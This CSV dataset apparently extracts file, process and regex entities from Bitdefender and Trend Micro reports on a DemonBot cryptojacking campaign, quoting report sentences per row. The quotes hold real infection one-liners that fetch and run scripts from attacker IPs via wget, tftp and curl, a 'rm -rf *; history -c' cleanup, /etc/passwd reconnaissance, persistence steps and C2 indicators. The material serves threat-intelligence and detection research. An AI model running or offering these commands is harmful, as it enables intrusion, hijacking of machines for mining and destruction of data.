report,word,verb,objectType,prettyReg,match,label,asgSyscall,sentence
Demonbot-bitdefender.csv,.5p4rk3l5,be,FILE,.5p4rk3l5,0,0,,"Their names differ between versions of the loader, so we will refer to those in the .93joshua script: · .k93 is used to launch the miner (.k4m3l0t) · /usr/bin/sshd is a systemd service script that launches .k93 · .5p4rk3l5 is a crontab file that executes .93joshua and .k93 Several persistence methods are employed: · creating a user and adding it to the sudo group; various names are used: gh0stx, sclipicibosu, mexalzsherifu · adding a SSH key to authorized_keys (attackers cycled through three different keys depending on the script) · creating a systemd service called myservice which runs the /usr/bin/sshd script:"
Demonbot-bitdefender.csv,/usr/bin/.pidsclip,,FILE,.pidsclip,0,0,, Paths: /usr/bin/.locationesclipiciu /var/tmp/.ladyg0g0/.pr1nc35 /usr/.SQL-Unix/.SQL/.db /var/tmp/.SQL-Unix/.SQL/.db /usr/bin/.pidsclip Network indicators: Mexalz.us area17.mexalz.us 45.32.112.68 207.148.118.221 requests.arhive.online cdn.arhive.online Attack matrix:
Demonbot-bitdefender.csv,.report_system,,FILE,.report_system,0,0,,The front page of 45.32.112.68: The front page of mexalz.us: The following tree shows an aggregated representation of the files currently or formerly hosted on mexalz.us: mexalz.us |-- .sherifu/ |   |   .93joshua |   |   .k4m3l0t |   |   .purrple |   |   .zte_error |   |   find.sh |   |-- jack.tar.gz |   |   |-- .jack1992/ |   |   |   |   brute |   |   |   |   dabrute |   |   |   |   lists/ |   |   |   |   mass |   |   |   |   masscan |   |   |   |   pass |   |   |   |   ranges_1.lst |   |   juanito.tar.gz |   |   |-- .juanito/ |   |   |   |   brute |   |   |   |   go |   |   |   |   pass |   |   |   |   ps2 |   |   |   |   r |   |   kamelot.tar.gz |   |   |-- .md/ |   |   |   go |   |   |   haiduc |   |   |   pass |   |   satan.db |   |   scn.tar.gz |   |   |-- .md/ |   |   |   go |   |   |   haiduc |   |   |   pass |   |   sefu |   |   skamelot.tar.gz |   |   |-- .b87kamelot/ |   |   |   |   99x |   |   |   |   go |   |   |   |   p |   |   |   |   r |   |   sky |-- .mini |   |   .black |   |   .report_system |   |   PhoenixMiner.tar |   |   banner |   |   ethminer.tar |   |   masscan
Demonbot-bitdefender.csv,/usr/bin/.locationesclipiciu,,FILE,/.*bin/.locationesclipiciu,0,0,, Paths: /usr/bin/.locationesclipiciu /var/tmp/.ladyg0g0/.pr1nc35 /usr/.SQL-Unix/.SQL/.db /var/tmp/.SQL-Unix/.SQL/.db /usr/bin/.pidsclip Network indicators: Mexalz.us area17.mexalz.us 45.32.112.68 207.148.118.221 requests.arhive.online cdn.arhive.online Attack matrix:
Demonbot-bitdefender.csv,/usr/bin/.pidsclip,,FILE,/.*bin/.pidsclip,0,0,, Paths: /usr/bin/.locationesclipiciu /var/tmp/.ladyg0g0/.pr1nc35 /usr/.SQL-Unix/.SQL/.db /var/tmp/.SQL-Unix/.SQL/.db /usr/bin/.pidsclip Network indicators: Mexalz.us area17.mexalz.us 45.32.112.68 207.148.118.221 requests.arhive.online cdn.arhive.online Attack matrix:
Demonbot-bitdefender.csv,/usr/bin/sshd,be,FILE,/.*bin/sshd,0,0,,"Their names differ between versions of the loader, so we will refer to those in the .93joshua script: · .k93 is used to launch the miner (.k4m3l0t) · /usr/bin/sshd is a systemd service script that launches .k93 · .5p4rk3l5 is a crontab file that executes .93joshua and .k93 Several persistence methods are employed: · creating a user and adding it to the sudo group; various names are used: gh0stx, sclipicibosu, mexalzsherifu · adding a SSH key to authorized_keys (attackers cycled through three different keys depending on the script) · creating a systemd service called myservice which runs the /usr/bin/sshd script:"
Demonbot-bitdefender.csv,/etc/passwd,intend/add,FILE,"/etc/passwd[-]{0,1}",1,1,open(),"*/\\1/p' nproc --all nvidia-smi -q | grep \Product Name\ lspci cut -d: -f6 /etc/passwd | grep \/home/\ Notably, one of the commands intends to discover the GPU model, which would be useful to judge the victim's potential in a cryptojacking scheme"
Demonbot-bitdefender.csv,/tmp,wget,FILE,/tmp.*,0,0,,"The infection payload follows these simple steps: cd /tmp cd /run cd /; wget http://194.33.45.197:8080/chernobyl/chernobyl.sh; chmod 777 chernobyl.sh; sh chernobyl.sh chernobyl; tftp 194.33.45.197 -c get chernobyltftp1.sh; chmod 777 chernobyltftp1.sh; sh chernobyltftp1.sh chernobyl; tftp -r chernobyltftp2.sh -g 194.33.45.197; chmod 777 chernobyltftp2.sh; sh chernobyltftp2.sh chernobyl; rm -rf chernobyl.sh chernobyltftp1.sh chernobyltftp2.sh; rm -rf *; history -c sky is a common Perl IRC bot, customized only in respect to the server details and used nicknames"
Demonbot-bitdefender.csv,/var/tmp/.ladyg0g0/.pr1nc35,,FILE,/tmp.*,0,0,, Paths: /usr/bin/.locationesclipiciu /var/tmp/.ladyg0g0/.pr1nc35 /usr/.SQL-Unix/.SQL/.db /var/tmp/.SQL-Unix/.SQL/.db /usr/bin/.pidsclip Network indicators: Mexalz.us area17.mexalz.us 45.32.112.68 207.148.118.221 requests.arhive.online cdn.arhive.online Attack matrix:
Demonbot-bitdefender.csv,"/usr/.SQL-Unix/.SQL/.db,",use,FILE,/usr/.SQL-Unix/.*,0,0,,"The auxiliary file /usr/.SQL-Unix/.SQL/.db, used to store part of the commands, is executed via the source built-in in .bashrc"
Demonbot-bitdefender.csv,/usr/.SQL-Unix/.SQL/.db,,FILE,/usr/.SQL-Unix/.*,0,0,, Paths: /usr/bin/.locationesclipiciu /var/tmp/.ladyg0g0/.pr1nc35 /usr/.SQL-Unix/.SQL/.db /var/tmp/.SQL-Unix/.SQL/.db /usr/bin/.pidsclip Network indicators: Mexalz.us area17.mexalz.us 45.32.112.68 207.148.118.221 requests.arhive.online cdn.arhive.online Attack matrix:
Demonbot-bitdefender.csv,.black,,PROC,^.black$,0,0,,The front page of 45.32.112.68: The front page of mexalz.us: The following tree shows an aggregated representation of the files currently or formerly hosted on mexalz.us: mexalz.us |-- .sherifu/ |   |   .93joshua |   |   .k4m3l0t |   |   .purrple |   |   .zte_error |   |   find.sh |   |-- jack.tar.gz |   |   |-- .jack1992/ |   |   |   |   brute |   |   |   |   dabrute |   |   |   |   lists/ |   |   |   |   mass |   |   |   |   masscan |   |   |   |   pass |   |   |   |   ranges_1.lst |   |   juanito.tar.gz |   |   |-- .juanito/ |   |   |   |   brute |   |   |   |   go |   |   |   |   pass |   |   |   |   ps2 |   |   |   |   r |   |   kamelot.tar.gz |   |   |-- .md/ |   |   |   go |   |   |   haiduc |   |   |   pass |   |   satan.db |   |   scn.tar.gz |   |   |-- .md/ |   |   |   go |   |   |   haiduc |   |   |   pass |   |   sefu |   |   skamelot.tar.gz |   |   |-- .b87kamelot/ |   |   |   |   99x |   |   |   |   go |   |   |   |   p |   |   |   |   r |   |   sky |-- .mini |   |   .black |   |   .report_system |   |   PhoenixMiner.tar |   |   banner |   |   ethminer.tar |   |   masscan
Demonbot-bitdefender.csv,.black,have,PROC,^.black$,0,0,,"In the current campaign, they use .93joshua, but they have a couple of others at their disposal; .purrple and .black"
Demonbot-bitdefender.csv,.black,loader,PROC,^.black$,0,0,, Indicators of compromise Samples: sha256 type name purpose d73a1c77783712e67db71cbbaabd8f158bb531d23b74179cda8b8138ba15941e ELF .93joshua loader ed2ae1f0729ef3a26c98b378b5f83e99741b34550fb5f16d60249405a3f0aa33 ELF .zte_error miner ef335e12519f17c550bba98be2897d8e700deffdf044e1de5f8c72476c374526 ELF .k4m3l0t miner 9de853e88ba363b124dfce61bc766f8f42c84340c7bd2f4195808434f4ed81e3 ELF .black loader eb0f3d25e1023a408f2d1f5a05bf236a00e8602a84f01e9f9f88ff51f04c8c94 ELF .purrple loader dcc52c4446adba5a61e172b973bca48a45a725a1b21a98dafdf18223ec8eb8b9 ELF .report_system miner 99531a7c39e3ea9529f5f43234ca5b23cb7bb82ee54f04eff631f5ca9153e6d4 ELF go scanner 74a425bcb5eb76851279b420c8da5f57a1f0a99a11770182c356ba3160344846 ELF go scanner 9f691e132f5a2c9468f58aeac9b7aa5df894d1ad54949f87364d1df2bf005414 script go scanner f53241f60a59ba20d29fab8c973a5b4c05c24865ae033fffb7cdfa799f0ad25d ELF r scanner 275ef26528f36f1af516b0847d90534693d4419db369027b981f77d79f07d357 script dabrute scanner 8beccb10b004308cadad7fa86d6f2ff47c92c95fc557bf05188c283df6942c13 ELF brute scanner f9ed735b2b8f89f9d8edfc6a8d11a4ee903e153777b33d214c245a02636d7745 ELF brute scanner 23cf4c34f151c622a5818ade68286999ae4db7364b5d9ed7b8ed035c58116179 script sky IRC bot 8dfdbc66ac4a38766ca1cb45f9b50e0f7f91784ad9b6227471469ae5793f6584 script find.sh scanner f1d4e2d8f63c3b68d56c668aafbf1c82d045814d457c9c83b37115b61c535baa archive jack.tar.gz 3078662f56861c98f96f8bc8647ffa70522dbc22cbd7ba91b9c80bc667d2a3a9 archive juanito.tar.gz 2a8298047add78360dc3e6d5ac4a38ddb7a67deebc769b1201895afe39b8c0e1 archive kamelot.tar.gz 7bfb35caf3f8760868c2985c4ccf749b14deab63ac6effd653871094fed0d5e5 archive satan.db f6e92eff8887ee28eb56602a3588a3d39ca24a35d9f88fe2551d87dc6ced8913 archive scn.tar.gz 8bf108ab897a480c44d56088662e592c088939eeb86cccaac6145de35eb3a024 script sefu 31a88ff5c0888bcbbbd02c1c18108c884ff02fd93a476e738d22b627e24601c0 archive skamelot.tar.gz e89b40a6e781ad80d688d1aa4677151805872b50a08aaf8aa64291456e4d476d archive PhoenixMiner.tar 2ef26484ec9e70f9ba9273a9a7333af195fb35d410baf19055eacbfa157ef251 ELF banner scanner 8970d74d96558b280567acdf147bfe289c431d91a150797aa5e3a8e8d52fb27d archive ethminer.tar 9aa8a11a52b21035ef7badb3f709fa9aa7e757788ad6100b4086f1c6a18c8ab2 ELF masscan scanner 1275e604a90acc2a0d698dde5e972ff30d4c506eae526c38c5c6aaa6a113f164 script setup 977dc6987a12c27878aef5615d2d417b2b518dc2d50d21300bfe1b700071d90e script install ccda60378a7f3232067e2d7cd0efe132e7a3f7c6a299e64ceba319c1f93a9aa2 ELF brute scanner
Demonbot-bitdefender.csv,.report_system,,PROC,^.report_system$,0,0,,The front page of 45.32.112.68: The front page of mexalz.us: The following tree shows an aggregated representation of the files currently or formerly hosted on mexalz.us: mexalz.us |-- .sherifu/ |   |   .93joshua |   |   .k4m3l0t |   |   .purrple |   |   .zte_error |   |   find.sh |   |-- jack.tar.gz |   |   |-- .jack1992/ |   |   |   |   brute |   |   |   |   dabrute |   |   |   |   lists/ |   |   |   |   mass |   |   |   |   masscan |   |   |   |   pass |   |   |   |   ranges_1.lst |   |   juanito.tar.gz |   |   |-- .juanito/ |   |   |   |   brute |   |   |   |   go |   |   |   |   pass |   |   |   |   ps2 |   |   |   |   r |   |   kamelot.tar.gz |   |   |-- .md/ |   |   |   go |   |   |   haiduc |   |   |   pass |   |   satan.db |   |   scn.tar.gz |   |   |-- .md/ |   |   |   go |   |   |   haiduc |   |   |   pass |   |   sefu |   |   skamelot.tar.gz |   |   |-- .b87kamelot/ |   |   |   |   99x |   |   |   |   go |   |   |   |   p |   |   |   |   r |   |   sky |-- .mini |   |   .black |   |   .report_system |   |   PhoenixMiner.tar |   |   banner |   |   ethminer.tar |   |   masscan
Demonbot-bitdefender.csv,bash,use,PROC,^bash$,0,0,,Several shell commands are disabled using bash aliases
Demonbot-bitdefender.csv,bash,execute,PROC,^bash$,1,1,exec()," After a successful authentication, the following bash commands are executed in the session with the purpose of collecting system information: uname -s -v -n -r -m uptime | grep -ohe 'up "
Demonbot-bitdefender.csv,Bash,involve,PROC,^bash$,0,0,,"In this case, their activity involves obfuscating Bash scripts by compiling them with a shell script compiler (shc) and using Discord to report the information back"
Demonbot-bitdefender.csv,chmod,,PROC,^chmod$,0,0,,"The infection payload follows these simple steps: cd /tmp cd /run cd /; wget http://194.33.45.197:8080/chernobyl/chernobyl.sh; chmod 777 chernobyl.sh; sh chernobyl.sh chernobyl; tftp 194.33.45.197 -c get chernobyltftp1.sh; chmod 777 chernobyltftp1.sh; sh chernobyltftp1.sh chernobyl; tftp -r chernobyltftp2.sh -g 194.33.45.197; chmod 777 chernobyltftp2.sh; sh chernobyltftp2.sh chernobyl; rm -rf chernobyl.sh chernobyltftp1.sh chernobyltftp2.sh; rm -rf *; history -c sky is a common Perl IRC bot, customized only in respect to the server details and used nicknames"
Demonbot-bitdefender.csv,chmod,be,PROC,^chmod$,0,0,,"In the currently live campaign, the attackers use the `skamelot.tar.gz`, which includes the following files: r (SHC compiled script) iterates through IP classes and runs go go (SHC compiled script) runs 99x (haiduc) with the infection payload p is a list of attempted credentials The infection payload executed in the SSH sessions is: curl -O http://45.32.112.68/.sherifu/.93joshua && chmod 777 .93joshua && ./.93joshua && uname -a Note: This file is still online, but attackers relocated to mexalz.us"
Demonbot-bitdefender.csv,crontab,be,PROC,^crontab$,0,0,,"Their names differ between versions of the loader, so we will refer to those in the .93joshua script: · .k93 is used to launch the miner (.k4m3l0t) · /usr/bin/sshd is a systemd service script that launches .k93 · .5p4rk3l5 is a crontab file that executes .93joshua and .k93 Several persistence methods are employed: · creating a user and adding it to the sudo group; various names are used: gh0stx, sclipicibosu, mexalzsherifu · adding a SSH key to authorized_keys (attackers cycled through three different keys depending on the script) · creating a systemd service called myservice which runs the /usr/bin/sshd script:"
Demonbot-bitdefender.csv,curl,be,PROC,^curl$,0,0,,"In the currently live campaign, the attackers use the `skamelot.tar.gz`, which includes the following files: r (SHC compiled script) iterates through IP classes and runs go go (SHC compiled script) runs 99x (haiduc) with the infection payload p is a list of attempted credentials The infection payload executed in the SSH sessions is: curl -O http://45.32.112.68/.sherifu/.93joshua && chmod 777 .93joshua && ./.93joshua && uname -a Note: This file is still online, but attackers relocated to mexalz.us"
Demonbot-bitdefender.csv,grep,print,PROC,^grep$,0,0,,"*' | sed 's/,//g' | awk '{ print $2\ \$3 }' uptime | grep -ohe '[0-9"
Demonbot-bitdefender.csv,grep,,PROC,^grep$,0,0,," After a successful authentication, the following bash commands are executed in the session with the purpose of collecting system information: uname -s -v -n -r -m uptime | grep -ohe 'up "
Demonbot-bitdefender.csv,grep,intend,PROC,^grep$,0,0,,"*/\\1/p' nproc --all nvidia-smi -q | grep \Product Name\ lspci cut -d: -f6 /etc/passwd | grep \/home/\ Notably, one of the commands intends to discover the GPU model, which would be useful to judge the victim's potential in a cryptojacking scheme"
Demonbot-bitdefender.csv,rm,be,PROC,^rm$,0,0,,"The infection payload follows these simple steps: cd /tmp cd /run cd /; wget http://194.33.45.197:8080/chernobyl/chernobyl.sh; chmod 777 chernobyl.sh; sh chernobyl.sh chernobyl; tftp 194.33.45.197 -c get chernobyltftp1.sh; chmod 777 chernobyltftp1.sh; sh chernobyltftp1.sh chernobyl; tftp -r chernobyltftp2.sh -g 194.33.45.197; chmod 777 chernobyltftp2.sh; sh chernobyltftp2.sh chernobyl; rm -rf chernobyl.sh chernobyltftp1.sh chernobyltftp2.sh; rm -rf *; history -c sky is a common Perl IRC bot, customized only in respect to the server details and used nicknames"
Demonbot-bitdefender.csv,uname,,PROC,^uname$,0,0,,"In the currently live campaign, the attackers use the `skamelot.tar.gz`, which includes the following files: r (SHC compiled script) iterates through IP classes and runs go go (SHC compiled script) runs 99x (haiduc) with the infection payload p is a list of attempted credentials The infection payload executed in the SSH sessions is: curl -O http://45.32.112.68/.sherifu/.93joshua && chmod 777 .93joshua && ./.93joshua && uname -a Note: This file is still online, but attackers relocated to mexalz.us"
Demonbot-trendmicro.csv,/usr/bin/yum,dropbear,FILE,/.*bin/yum,0,0,,{BLOCKED}.216:41061 Other Details  This Backdoor does the following:  Checks for the following folder to know architecture: /usr/bin/apt-get - Ubuntu /usr/lib/portage - Gentoo /usr/bin/yum - CentOS /usr/share/YaST2 - OpenSUSE /usr/local/etc/pkg - FreeBSD /etc/dropbear/ - Dropbear /etc/opkg - OpenWRT
Demonbot-trendmicro.csv,Yes,,PROC,^yes$,0,0,,"Backdoor.Linux.BASHLITE.SMJC2 August 19, 2019  Analysis by: Wilbert Luy ALIASES: HEUR:Backdoor.Linux.Mirai.h (Kaspersky), Backdoor:Linux/DemonBot.YA!MTB (Microsoft)  TECHNICAL DETAILS FILE SIZE: 62,028 bytes FILE TYPE: ELF MEMORY RESIDENT: Yes INITIAL SAMPLES RECEIVED DATE: 19 Aug 2019 PAYLOAD: Connects to URLs/IPs, Collects system information, Others Arrival Details  This Backdoor arrives on a system as a file dropped by other malware or as a file downloaded unknowingly by users when visiting malicious sites"
